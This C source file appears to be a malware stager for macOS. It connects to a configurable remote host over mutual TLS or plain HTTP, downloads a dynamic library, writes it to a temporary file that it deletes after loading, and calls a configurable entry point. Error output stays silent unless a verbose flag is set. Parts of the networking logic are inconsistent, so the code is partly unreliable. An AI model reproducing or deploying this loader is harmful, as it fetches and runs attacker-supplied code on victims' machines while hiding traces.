#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <signal.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define BUFFER_SIZE 4096
#define MTLS
#define CERT_FILE "./certs/client-cert.pem"
#define KEY_FILE "./certs/client-key.pem"
#define CA_FILE "./certs/ca-cert.pem"
//#define RAW

struct Memory {
    char *data;
    size_t size;
};

struct Memory global_mem;

//MTLS SECTION
#ifdef MTLS
void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    SSL_CTX_set_ecdh_auto(ctx, 1);

    int error_flag = 0;

    if (SSL_CTX_use_certificate_file(ctx, CERT_FILE, SSL_FILETYPE_PEM) <= 0) {
        #ifdef VERBOSE
        ERR_print_errors_fp(stderr);
        #endif
        perror("[ERROR] Unable to set certificate");
        error_flag = 1;
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, KEY_FILE, SSL_FILETYPE_PEM) <= 0 ) {
        #ifdef VERBOSE
        ERR_print_errors_fp(stderr);
        #endif
        perror("[ERROR] Unable to set private key");
        error_flag = 1;
    }

    if (SSL_CTX_load_verify_locations(ctx, CA_FILE, NULL) <= 0) {
        #ifdef VERBOSE
        ERR_print_errors_fp(stderr);
        #endif
        perror("[ERROR] Unable to set CA file");
        error_flag = 1;
    }

    if (error_flag) {
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
    SSL_CTX_set_verify_depth(ctx, 1);
}

int create_socket(const char *hostname, int port) {
    int sock;
    struct hostent *host;
    struct sockaddr_in addr;

    if ((host = gethostbyname(hostname)) == NULL) {
        perror("Unable to resolve host");
        exit(EXIT_FAILURE);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long*)(host->h_addr_list[0]);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Unable to connect");
        exit(EXIT_FAILURE);
    }

    return sock;
}

void communicate_with_server(const char *hostname, int port) {
    SSL_CTX *ctx;
    SSL *ssl;
    int server;

    initialize_openssl();
    ctx = create_context();
    configure_context(ctx);

    server = create_socket(hostname, port);
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, server);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        #ifdef VERBOSE
        printf("Connected to %s\n", hostname);
        #endif
        // Use SSL_write and SSL_read for communication
        send_https_get_request(ssl, hostname, "/");
        char buffer[BUFFER_SIZE];
        int bytes = SSL_read(ssl, buffer, sizeof(buffer));
        buffer[bytes] = 0;
        printf("Received: %s\n", buffer);
    }

    SSL_free(ssl);
    close(server);
    SSL_CTX_free(ctx);
    cleanup_openssl();
}
#endif
//MTLS SECTION END

void cleanup(int signum) {
    if (global_mem.data) {
        free(global_mem.data);
    }
    exit(signum);
}

void setup_signal_handlers() {
    struct sigaction sa;
    sa.sa_handler = cleanup;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    sigaction(SIGINT, &sa, NULL);  // Handle Ctrl+C
    sigaction(SIGTERM, &sa, NULL); // Handle termination signal
}

#ifdef RAW
int create_socket(const char *hostname, int port) {
    struct hostent *server;
    struct sockaddr_in server_addr;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        #ifdef VERBOSE
        perror("Error opening socket");
        #endif
        exit(1);
    }

    server = gethostbyname(hostname);
    if (!server) {
        #ifdef VERBOSE
        fprintf(stderr, "Error, no such host\n");
        #endif
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        #ifdef VERBOSE
        perror("Error connecting to server");
        #endif
        exit(1);
    }

    return sockfd;
}
#endif

#ifdef MTLS
void send_https_get_request(SSL *ssl, const char *hostname, const char *path) {
    char request[1024];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, hostname);
    SSL_write(ssl, request, strlen(request));
}
#endif

#ifdef RAW
void send_http_get_request(int sockfd, const char *hostname, const char *path) {
    char request[1024];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, hostname);
    send(sockfd, request, strlen(request), 0);
}
#endif

struct Memory download_dylib(const char *hostname, const char *path) {
    int sockfd = create_socket(hostname, PORT);
    #ifdef MTLS
    communicate_with_server(hostname, PORT);
    #endif
    #ifdef RAW
    send_http_get_request(sockfd, hostname, path);
    #endif

    struct Memory mem = {0};

    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;

    int header_parsed = 0;

    while ((bytes_read = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
        if (!header_parsed) {
            char *header_end = strstr(buffer, "\r\n\r\n");
            if (header_end) {
                size_t header_size = header_end - buffer + 4;
                size_t content_size = bytes_read - header_size;

                mem.data = malloc(content_size);
                if (!mem.data) {
                    #ifdef VERBOSE
                    perror("malloc failed");
                    #endif
                    close(sockfd);
                    exit(1);
                }
                memcpy(mem.data, header_end + 4, content_size);
                mem.size = content_size;

                header_parsed = 1;
            }
        } else {
            mem.data = realloc(mem.data, mem.size + bytes_read);
            if (!mem.data) {
                #ifdef VERBOSE
                perror("realloc failed");
                #endif
                close(sockfd);
                exit(1);
            }
            memcpy(mem.data + mem.size, buffer, bytes_read);
            mem.size += bytes_read;
        }
    }

    if (bytes_read < 0) {
        #ifdef VERBOSE
        perror("recv failed");
        #endif
    }

    close(sockfd);
    return mem;
}

void *load_dylib_from_memory(struct Memory *mem) {
    void *mem_fd = mmap(NULL, mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem_fd == MAP_FAILED) {
        #ifdef VERBOSE
        perror("mmap failed");
        #endif
        return NULL;
    }

    memcpy(mem_fd, mem->data, mem->size);

    if (mprotect(mem_fd, mem->size, PROT_READ | PROT_EXEC) == -1) {
        #ifdef VERBOSE
        perror("mprotect failed");
        #endif
        return NULL;
    }


    char temp_filename[] = TMP_FILENAME;
    int fd = mkstemp(temp_filename);
    if (fd == -1) {
        #ifdef VERBOSE
        fprintf(stderr, "Failed to create temporary file descriptor\n");
        #endif
        return NULL;
    }

    write(fd, mem->data, mem->size);
    lseek(fd, 0, SEEK_SET);

    void *handle = dlopen(temp_filename, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        #ifdef VERBOSE
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
        #endif
    }

    close(fd);
    unlink(temp_filename);

    return handle;
}

int main() {
    setup_signal_handlers();

    const char *hostname = HOST;
    const char *path = DYLIB_PATH;

    #ifdef VERBOSE
    printf("Downloading dylib from http://%s%s...\n", hostname, path);
    #endif
    struct Memory mem = download_dylib(hostname, path);
    if (mem.data == NULL || mem.size == 0) {
        #ifdef VERBOSE
        fprintf(stderr, "Failed to download the dylib\n");
        #endif
        return 1;
    }

    #ifdef VERBOSE
    printf("Downloaded %lu bytes\n", mem.size);
    #endif

    void *handle = load_dylib_from_memory(&mem);
    if (!handle) {
        #ifdef VERBOSE
        fprintf(stderr, "Failed to load dylib from memory\n");
        #endif
        free(mem.data);
        return 1;
    }

    void (*ENTRY_POINT_FUNC)() = dlsym(handle, ENTRY_POINT);
    if (!ENTRY_POINT_FUNC) {
        #ifdef VERBOSE
        fprintf(stderr, "dlsym failed: %s\n", dlerror());
        #endif
    } else {
        #ifdef VERBOSE
        printf("Calling the function from the dylib...\n");
        #endif
        ENTRY_POINT_FUNC();
    }

    dlclose(handle);
    free(mem.data);
    return 0;
}
